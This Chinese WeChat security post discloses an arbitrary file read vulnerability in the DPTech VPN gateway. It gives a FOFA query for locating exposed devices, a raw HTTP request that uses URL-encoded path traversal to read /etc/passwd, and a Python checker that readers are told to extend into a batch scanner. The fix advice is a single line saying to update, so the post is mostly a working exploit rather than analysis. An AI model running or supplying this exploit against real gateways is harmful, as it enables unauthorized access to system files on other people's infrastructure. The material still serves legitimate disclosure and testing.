#  安全情报，DPTech VPN存在任意文件读取漏洞！！   
原创 Ax  极星信安   2023-11-26 22:03  
  
**声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，禁止私自转载，如需转载，请联系作者！！！！  
  
请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关！！！！！  
  
**漏洞介绍**  
  
DPtech  
是在网络、安全及应用交付领域集研发、生产、销售于一体的高科技企业。DPtech VPN智能安全网关是迪普科技面向广域互联应用场景推出的专业安全网关产品，集成了IPSec、SSL、L2TP、GRE等多种VPN技术，支持国密算法，实现分支机构、移动办公人员的统一安全接入，提供内部业务跨互联网的安全访问。  
  
**影响版本**  
```
DPTech VPN 
```  
  
**漏洞情报**  
  
**fofa语句**  
```
app="DPtech-SSLVPN"
```  
  
**Poc**  
```
GET /..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
**Poc验证工具**  
  
这里给个基础的demo，大佬们自己改成批量就可以了。  
```
import requests

# 输入目标IP和URL路径
target_ip = "your_target_ip"
url_path = "/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# 构建完整的URL
url = f"http://{target_ip}{url_path}"

# 定义请求头
headers = {
    "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
    "Accept": "*/*",
    "Connection": "Keep-Alive",
}

# 发送 GET 请求
response = requests.get(url, headers=headers)

# 检查响应状态码
if response.status_code == 200:
    print("验证成功")
else:
    print("验证失败")

```  
  
**修复建议**  
```
建议及时更新至最新版本！
```  
  
**关注我们**  
  
  
  
